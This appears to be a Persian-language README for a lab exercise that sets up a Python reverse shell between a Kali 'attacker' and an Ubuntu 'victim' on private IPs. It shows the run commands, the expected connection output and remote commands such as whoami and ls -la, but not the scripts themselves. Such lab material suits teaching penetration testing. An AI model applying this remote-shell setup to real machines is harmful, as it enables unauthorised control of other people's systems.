
مرحله 1

```
ifconfig
```
بر اساس تصاویر که موجود هست  آی‌پی ها رو تغییر بده

<p align="center">
<h2>Victem</h2>
<a href="https://github.com/sinalalebakhsh/reverse-shell-for-penetration/blob/main/victem-ubuntu-desktop.png" target="blank"><img align="center" src="https://github.com/sinalalebakhsh/reverse-shell-for-penetration/blob/main/victem-ubuntu-desktop.png" alt="victem" height="500" width="630" /></a>
<h2>Attacker</h2>
<a href="https://github.com/sinalalebakhsh/reverse-shell-for-penetration/blob/main/attacker-ubuntu-desktop.png" target="blank"><img align="center" src="https://github.com/sinalalebakhsh/reverse-shell-for-penetration/blob/main/attacker-ubuntu-desktop.png" alt="attacker" height="500" width="630" /></a> </p>

#### 🚀 راهنمای اجرای مرحله‌به‌مرحله:

مرحله 2: روی Kali Linux
```bash
# 1. کد را ذخیره کنید
nano attacker_kali.py

# 2. اجرای سرور
python3 attacker_kali.py
```

#### خروجی مورد انتظار:

```Terminal
[*] Kali Linux Reverse Shell Server
[*] Listening on 192.168.253.129:9999
[*] Waiting for Ubuntu (192.168.253.128) to connect...
```


#### مرحله 3: روی Ubuntu (قربانی)

```bash
# ۱. کد قربانی را اجرا کن
python3 victim_ubuntu.py
```

باید این پیام را ببینی:
```Terminal
[*] Connecting to Kali Linux at 192.168.253.129:9999
[+] Connected to attacker at 192.168.253.129
```

#### مرحله 4: برگرد به Kali
روی Kali باید ببینی:

```Terminal
[+] Connection established from 192.168.253.128
Ready for commands...
kali@shell# 
```


#### مرحله 5: دستورات را امتحان کن
روی Kali تایپ کن:
```
kali@shell# whoami
```
باید اسم کاربر Ubuntu را ببینی!

#### 🎮 دستورات تست سریع:
روی Kali این دستورات را یکی یکی امتحان کن:
```bash
kali@shell# id            # اطلاعات کاربر
```
<br>

```bash
kali@shell# pwd           # مسیر فعلی
```
<br>

```bash
kali@shell# ls -la        # فایل‌ها
```
<br>

```bash
kali@shell# uname -a      # اطلاعات سیستم
```
<br>

```bash
kali@shell# ifconfig      # شبکه Ubuntu
```
<br>

```bash
```